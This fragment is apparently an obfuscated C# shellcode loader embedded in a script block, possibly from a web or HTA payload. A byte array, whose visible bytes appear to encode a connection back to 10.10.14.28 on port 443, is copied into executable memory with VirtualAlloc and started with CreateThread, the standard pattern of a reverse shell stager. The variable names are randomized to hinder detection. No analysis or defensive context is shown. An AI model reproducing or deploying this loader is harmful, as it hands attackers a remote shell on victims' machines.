...
0x68,0x0a,0x0a,0x0e,0x1c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr p2F3o0HRj = VirtualAlloc(IntPtr.Zero,(UIntPtr)iEC0VrD.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(iEC0VrD,0,p2F3o0HRj,iEC0VrD.Length);
        IntPtr vjzMkFF0A8 = IntPtr.Zero;
        IntPtr pjKA1keCZ = CreateThread(IntPtr.Zero,UIntPtr.Zero,p2F3o0HRj,IntPtr.Zero,0,ref vjzMkFF0A8);
    }
</script>
